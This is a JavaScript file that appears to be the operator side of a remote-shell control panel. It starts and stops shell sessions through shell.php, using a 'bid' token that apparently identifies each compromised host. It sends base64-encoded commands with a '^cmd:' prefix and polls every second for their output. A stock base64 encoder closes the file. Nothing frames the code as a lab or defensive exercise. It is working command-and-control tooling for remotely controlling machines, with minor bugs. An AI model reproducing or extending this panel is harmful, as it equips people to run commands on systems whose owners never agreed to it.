        	var timer = null;	

		function __get_keyboard(e,obj) {
			var code = (e.keyCode ? e.keyCode : e.which);
 			if(code == 13) { 
				__shell_send();
			}
		}

	
	        function __shell_load() {
			if(timer==null) {
				__set_shell_status(1);
				document.rev_form.start_button.value = "Stop";	
				timer = setInterval(function(){__get_shell_status()},1000);
				timer2 = setInterval(function(){__get_keyboard()},1000);
			}
			else {
				__set_shell_status(0);
				document.rev_form.start_button.value = "Start";	
				clearInterval(timer);
				timer = null;
				__shell_clear();
			}
                }


		function __shell_clear() {
			document.rev_form.txtReplyShell.value="";
			document.rev_form.txtcommand.value="";
		}

		function __get_query_variable(variable)
		{
       			var query = window.location.search.substring(1);
       			var vars = query.split("&");
       			for (var i=0;i<vars.length;i++) {
               			var pair = vars[i].split("=");
               			if(pair[0] == variable){return pair[1];}
     		 	 }
		
       			return(false);
		}



                function __get_shell_status() {
                        var url="";
			var file="shell.php";
			var token = __get_query_variable("bid");
                        var data="?option=0&bid=" + token;

	
			if(!token || token.length === 0) {
                                 return 0;
                        }
			
			url=__get_url();
			url+=file+data;

                        var dom = __get_dom();

			dom.onreadystatechange=function()
                         {
                        	if(dom.responseText.localeCompare("Error: duplication shell")==0) {
					alert("Shell session not enable please restart shell now");
					document.recv_form.txtReplyShell.value="Shell session not enable please unlock this\n";
				}

				else if(dom.responseText.length>1) {
				        document.rev_form.txtReplyShell.value=dom.responseText;
		                }


			}

                        dom.open("GET", url, true);
                        dom.send();
			//dom.close();
                }

		function __set_shell_status(stat) {
			var url="";
			var file="shell.php";
			var token = __get_query_variable("bid");


			if(!token || token.length===0)
				alert("Token error");

			if(stat==1)
				var data="?option=1&bid=" + token;
			else 
				var data="?option=2&bid=" + token;

			
                        url = __get_url() + file + data;
			var dom = __get_dom();

			dom.open("GET", url, true);
			dom.send();
			//dom.close();

			return(0);
		}


		function __shell_send() {
				var command = document.rev_form.txtcommand.value;
				var url = "";
				var file= "shell.php";
				var token = __get_query_variable("bid");
				var data = "?option=3&bid=" + token + "&data=" + base64_encode(command);

	
				if(!token || token.length === 0)
					return 0;
				

				if(command.length<1) {
					alert("Invalid command");
					return 0;
				}
		
				if(timer==null) {
					alert("Not is possible send command before start shell");
					return 0;
				}
					
		
				url=__get_url() + file + data;	

				var dom=__get_dom();
				dom.open("GET", url, true);
				dom.send();
				document.rev_form.txtcommand.value="";
		}


		function __comand_type(command) {
			if(command.charAt(0)=='^') {
				return(command);
			}
			else {
				var end_command = "^cmd:" + command;
				return(end_command);
			}
		}


		function __get_url() {
                        var pathArray = window.location.pathname.split('/');

                        url = window.location.protocol;
                        url += "//";
                        url += window.location.host;

                        for(i=0;i<=pathArray.length-2;i++) {
                                url += pathArray[i];
                                url += "/";
                        }


                        return(url);
		}

		function __get_dom() {
			var dom ="";
			if(window.XMLHttpRequest) {
                                dom = new XMLHttpRequest();
                        }

                        else {
                                dom = new ActiveXObject("Microsoft.XMLHTTP");
                        }
			
			return(dom);
		}


//base64 encoder
function base64_encode(data) {
  //  discuss at: http://phpjs.org/functions/base64_encode/
  // original by: Tyler Akins (http://rumkin.com)
  // improved by: Bayron Guevara
  // improved by: Thunder.m
  // improved by: Kevin van Zonneveld (http://kevin.vanzonneveld.net)
  // improved by: Kevin van Zonneveld (http://kevin.vanzonneveld.net)
  // improved by: Rafał Kukawski (http://kukawski.pl)
  // bugfixed by: Pellentesque Malesuada
  //   example 1: base64_encode('Kevin van Zonneveld');
  //   returns 1: 'S2V2aW4gdmFuIFpvbm5ldmVsZA=='
  //   example 2: base64_encode('a');
  //   returns 2: 'YQ=='
  //   example 3: base64_encode('✓ à la mode');
  //   returns 3: '4pyTIMOgIGxhIG1vZGU='

  var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
  var o1, o2, o3, h1, h2, h3, h4, bits, i = 0,
    ac = 0,
    enc = '',
    tmp_arr = [];

  if (!data) {
    return data;
  }

  data = unescape(encodeURIComponent(data));

  do {
    // pack three octets into four hexets
    o1 = data.charCodeAt(i++);
    o2 = data.charCodeAt(i++);
    o3 = data.charCodeAt(i++);

    bits = o1 << 16 | o2 << 8 | o3;

    h1 = bits >> 18 & 0x3f;
    h2 = bits >> 12 & 0x3f;
    h3 = bits >> 6 & 0x3f;
    h4 = bits & 0x3f;

    // use hexets to index into b64, and append result to encoded string
    tmp_arr[ac++] = b64.charAt(h1) + b64.charAt(h2) + b64.charAt(h3) + b64.charAt(h4);
  } while (i < data.length);

  enc = tmp_arr.join('');

  var r = data.length % 3;

  return (r ? enc.slice(0, r - 3) : enc) + '==='.slice(r || 3);
}

